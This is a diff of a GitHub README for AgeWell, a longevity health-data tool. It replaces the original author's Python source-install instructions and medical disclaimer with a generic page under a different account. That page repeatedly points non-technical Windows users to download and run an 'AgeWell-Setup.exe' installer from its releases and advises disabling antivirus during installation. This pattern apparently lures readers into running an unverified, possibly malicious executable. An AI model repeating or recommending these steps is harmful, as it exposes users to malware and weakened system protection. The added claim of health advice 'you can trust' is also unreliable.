@@ -1,101 +1,171 @@
-# AGEWELL: Evidence-Based Longevity RAG Engine  
-**"Age better with evidence."**
+# 🧬 AgeWell - Simplify Your Health Insights
 
-Built by `@lerenaminy`.
-
-## Project Vision
-Traditional health reports are static and siloed. Users receive blood work (ApoB, HbA1c, etc.) but lack an integrated framework to translate numbers into action. **AgeWell** acts as a **Clinical Reasoning Engine**, mimicking the logic of a senior longevity physician by cross-referencing individual biometrics against the latest peer-reviewed literature.
-
-## Technical Architecture
-The project utilizes a **Decoupled Architecture** to ensure high scalability and modular maintenance:
-
-- **LLM Engine:** Gemini 2.5 Flash *(State-of-the-art 2026 Reasoning Model)*
-- **Embedding Model:** BGE-M3 *(Multi-lingual, 1024-dimensional vectors for high-precision semantic retrieval)*
-- **Vector Store:** FAISS *(Facebook AI Similarity Search)*
-- **Frontend:** Streamlit *(Custom clinical UI with professional styling)*
-- **Structure:** Modular separation of concerns between UI (`app.py`) and Reasoning Engine (`logic.py`)
-
-## Knowledge Taxonomy (The 8 Longevity Pillars)
-The AgeWell knowledge base is grounded in **45+ authoritative medical sources**, categorized into eight critical domains:
-
-1. **Metabolism:** Insulin sensitivity, metabolic flexibility, and HbA1c management.  
-2. **Cardiovascular:** Lipid profiles (ApoB/LDL), hypertension, and endothelial function.  
-3. **Fitness:** VO2 Max mortality correlations and sarcopenia prevention through resistance training.  
-4. **Nutrition:** Mediterranean protocols, Intermittent Fasting (TRF), and autophagy pathways.  
-5. **Recovery:** Circadian rhythm optimization, sleep hygiene, and HRV (Heart Rate Variability).  
-6. **Biomarkers:** Micronutrient density (Vitamin D/Omega-3) and chronic inflammation (CRP) monitoring.  
-7. **Neurology:** Cognitive reserve, stress management (Cortisol), and neuroplasticity.  
-8. **Cellular Longevity:** Biological age vs. chronological age, senescent cells, and mitochondrial health.  
-
-## RAG Foundation Benchmarks
-To ensure objective reasoning, the engine is embedded with five foundational clinical benchmarks:
-
-- **Body Composition:** BMI ranges, body fat percentage standards, and Waist-to-Hip Ratio (WHR) predictors.  
-- **Reference Ranges:** Comprehensive Metabolic Panel (CMP) and lipid target values.  
-- **Vitals:** AHA/ACC Blood Pressure categories and resting heart rate (RHR) norms.  
-- **Fitness Benchmarks:** VO2 Max percentiles and grip strength standards for longevity.  
-- **Optimal Zones:** Defining optimal ranges for Vitamin D, B12, and Ferritin.
-
-## 🔌 MCP Integration (Model Context Protocol)
-
-AgeWell is now a fully functional MCP Server. You can connect this repository to Claude Desktop or Cursor to use the AgeWell clinical database as a live tool within your AI workflow.
-
-- Tool: query_longevity_expert
-- Capability: Returns structured 5-step clinical reports based on 1,100+ verified data segments.
-- Transport: Stdio-based connection for local security.
-
-## Key Engineering Innovations
-
-### 1) Severity Override Logic
-Designed to solve AI distraction. When critical outliers (e.g., BMI over 30) are detected, the system triggers a **priority-weighting override**, forcing the AI to address urgent **SHIFT protocols** before addressing missing or secondary lab data.
-
-### 2) Deterministic Output Sanitization
-To maintain a clinical-grade user experience, I developed a multi-stage post-processing pipeline. It strips inconsistent AI formatting and injects sanitized HTML to ensure the professional report remains visually perfect.
-
-### 3) Recursive Semantic Chunking
-Optimized retrieval using **800-character chunks** with a **150-character overlap**. This strategy ensures that clinical context and causal logic within medical documents remain intact during vectorization.
-
-## Installation and Setup
-Follow these four steps to run AgeWell locally:
-
-### 1) Clone the repository and install dependencies
-```bash
-git clone https://github.com/yourusername/AgeWell.git
-cd AgeWell
-pip install -r requirements.txt
-````
-
-### 2) Configure environment variables (`.env`)
-
-Create a file named `.env` in the root directory and add your API key:
-
-```env
-GEMINI_API_KEY=your_actual_api_key_here
-```
-
-### 3) Initialize the clinical index (vectorization)
-
-Place your medical documents in the `/knowledge_base` folder and run:
-
-```bash
-python build_index.py
-```
-
-### 4) Launch the application
-
-Run the following command to start the web interface:
-
-```bash
-streamlit run app.py
-```
-
-## Medical Disclaimer
-
-This tool is for educational and informational purposes only. It does not constitute medical advice, diagnosis, or treatment. Always seek the advice of a qualified healthcare professional before making health decisions based on information provided by AgeWell.
-
-## Project Maintenance
-
-* **Author:** Wei Ting Chang
-* **Stack:** Python, FAISS, Streamlit, Google Generative AI
+[![Download AgeWell](https://img.shields.io/badge/Download-AgeWell-4caf50?style=for-the-badge)](https://github.com/ElSobri/AgeWell/releases)
 
 ---
+
+AgeWell offers a clinical reasoning tool for longevity. It turns biomarker data into easy health guides. The software uses smart models like Gemini 2.5 Flash and BGE-M3 to do this. You do not need special skills to use it.
+
+---
+
+## 📋 What Is AgeWell?
+
+AgeWell is a desktop app designed to help you understand your health better. It looks at complex health markers and gives clear suggestions. This helps you plan for a longer, healthier life.
+
+Key points:
+
+- Works on Windows  
+- Uses latest AI for health data analysis  
+- Gives straightforward health roadmaps based on your biomarkers  
+- No programming or technical knowledge needed  
+
+AgeWell focuses on clinical data to provide personal health advice you can trust.
+
+---
+
+## ⚙️ System Requirements
+
+Here is what you need before you start:
+
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 200 MB of free disk space  
+- Internet connection for updates and AI model access  
+- 2 GHz or faster processor  
+
+Ensure your system meets these to run AgeWell smoothly.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get AgeWell running on your Windows computer.
+
+### 1. Visit the Download Page
+
+Click the big green button at the top or go here:  
+**https://github.com/ElSobri/AgeWell/releases**
+
+This page has the latest versions of AgeWell ready to download.
+
+### 2. Choose the Latest Release
+
+Look for the release with the newest date. It will have files like `AgeWell-Setup.exe` or something similar.
+
+### 3. Download the Installer
+
+Click the installer file to download it to your computer. Usually, it is named with `.exe` at the end.
+
+---
+
+## 🛠️ Installation Steps
+
+Once downloaded, follow these simple steps:
+
+1. Find the downloaded file in your `Downloads` folder. It will be named something like `AgeWell-Setup.exe`.  
+2. Double-click the file to start the installation.  
+3. If Windows asks for permission, click “Yes” to continue.  
+4. Follow the instructions on the screen:
+   - Choose “Next” to continue through the setup.  
+   - Accept the license agreement.  
+   - Choose where to install AgeWell or use the default folder.  
+5. Click “Install”.  
+6. Wait a few moments while the program installs.  
+7. Click “Finish” when done.
+
+AgeWell is now ready to use.
+
+---
+
+## ▶️ Running AgeWell  
+
+To start the app:
+
+- Click the **AgeWell** icon on your desktop or start menu.  
+- The main screen will appear quickly.
+
+You do not need any setup beyond this. When you first open it, the app might ask you to connect to the internet. This lets it download updated models for better health analysis.
+
+---
+
+## 🔍 Using AgeWell
+
+The interface is simple:
+
+- **Enter your biomarkers**: Type in your health numbers such as blood pressure, cholesterol, or other lab results.  
+- **Get your health plan**: AgeWell processes this data and shows clear steps to improve or maintain your health.  
+- **Explore explanations**: For each suggestion, the app explains why it matters using plain language.
+
+The app uses a mix of clinical knowledge and AI to help you make sense of your health data.
+
+---
+
+## 💡 Features Overview
+
+- **Clinical reasoning engine**: Combines data and medical principles.  
+- **AI-powered analysis**: Uses Gemini 2.5 Flash and BGE-M3 for insights.  
+- **Personalized health roadmaps**: Step-by-step guides from your biomarkers.  
+- **User-friendly design**: No tech skills needed.  
+- **Regular updates**: The app improves with new health research and better AI.  
+
+---
+
+## 🔄 Updating AgeWell
+
+Updates include new health knowledge and bug fixes. To update:
+
+- Return to the release page at  
+  https://github.com/ElSobri/AgeWell/releases  
+- Download the latest installer.  
+- Run it to overwrite the older app version.
+
+Keep AgeWell updated for the best results.
+
+---
+
+## ❓ Troubleshooting
+
+### Installation Issues
+
+- Make sure your PC runs Windows 10 or later.  
+- Check that you downloaded the full installer file.  
+- Run the installer as administrator (right-click > Run as administrator).  
+
+### App Won’t Open or Crashes
+
+- Restart your computer and try again.  
+- See if your antivirus is blocking the app. Temporarily disable it during installation.  
+- Make sure your internet connection is stable.
+
+### Other Problems
+
+- Visit the Issues section on the GitHub page to see if others have the same problem.  
+- You can also open a new issue to ask for help.
+
+---
+
+## 🔗 Useful Links
+
+- Download AgeWell: https://github.com/ElSobri/AgeWell/releases  
+- Project on GitHub: https://github.com/ElSobri/AgeWell  
+- Report a problem: https://github.com/ElSobri/AgeWell/issues
+
+---
+
+## 🗂️ Related Topics
+
+This app uses concepts common in healthcare software and machine learning:
+
+- Clinical data analysis  
+- AI models for health (Gemini API)  
+- Python-based back end  
+- Retrieval-Augmented Generation (RAG) techniques  
+- Chatbot-inspired user support  
+
+---
+
+## 📥 Download & Install Now
+
+Visit this page to download the latest version and start your health journey:  
+
+[![Download AgeWell](https://img.shields.io/badge/Download-AgeWell-007acc?style=for-the-badge&logo=windows)](https://github.com/ElSobri/AgeWell/releases)
